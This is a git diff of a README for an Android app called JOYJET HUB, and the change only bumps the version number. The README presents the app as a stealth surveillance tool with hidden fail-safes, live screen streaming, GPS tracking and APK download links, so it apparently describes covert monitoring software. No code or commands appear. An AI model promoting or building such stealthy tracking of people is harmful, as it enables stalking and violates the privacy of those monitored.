@@ -1,15 +1,14 @@
-# 🛸 JOYJET HUB | Tactical Surveillance & Stealth Ecosystem (v4.2.0)
+# 🛸 JOYJET HUB | Tactical Surveillance & Stealth Ecosystem (v4.2.1)
 
 ![Build Status](https://github.com/guru9/joyjet-hub/actions/workflows/android-build.yml/badge.svg)
-[![Download Latest APK (v4.2.0)](https://img.shields.io/badge/Download-Latest_APK-brightgreen?style=for-the-badge&logo=android)](https://github.com/guru9/joyjet-hub/releases/download/latest/app-debug.apk)
+[![Download Latest APK (v4.2.1)](https://img.shields.io/badge/Download-Latest_APK-brightgreen?style=for-the-badge&logo=android)](https://github.com/guru9/joyjet-hub/releases/download/latest/app-debug.apk)
 [![Download Old APK (v4.1.0)](https://img.shields.io/badge/Rollback-Old_APK-orange?style=for-the-badge&logo=android)](https://github.com/guru9/joyjet-hub/releases/download/v4.1.0/app-debug.apk)
-
 
 JOYJET is a high-performance, low-footprint monitoring solution built with React Native (Expo) and Node.js. It features intelligent data management, automated fail-safes for stealth, and real-time telemetry.
 
 ---
 
-## ⚡ LATEST TACTICAL UPDATES (v4.2.0)
+## ⚡ LATEST TACTICAL UPDATES (v4.2.1)
 
 - **WebRTC HD Streaming**: Sub-second latency live screen sharing using secure Peer-to-Peer tunnels.
 - **Pinpoint GPS Tracking**: Integrated high-precision location updates visualized on a dark-mode Tactical Map.
